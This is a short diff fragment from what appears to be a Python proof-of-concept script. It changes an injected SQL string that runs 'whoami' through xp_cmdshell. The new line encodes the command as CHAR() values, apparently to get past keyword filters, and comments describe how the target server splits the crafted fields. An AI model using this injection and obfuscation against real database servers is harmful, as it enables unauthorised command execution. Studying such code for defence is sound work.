@@ -77,7 +77,7 @@ def main():
 
     today = datetime.now().strftime("%Y-%m-%d")
     uid = str(uuid.uuid4()).replace("-", "")[:16]
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
+    sql = "EXEC xp_cmdshell CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105)"
 
     # Field order: ActionType::ConnType:FileOrSql:SecureHash:UserId
     # Server replaces '=' with ':' then splits on ':'
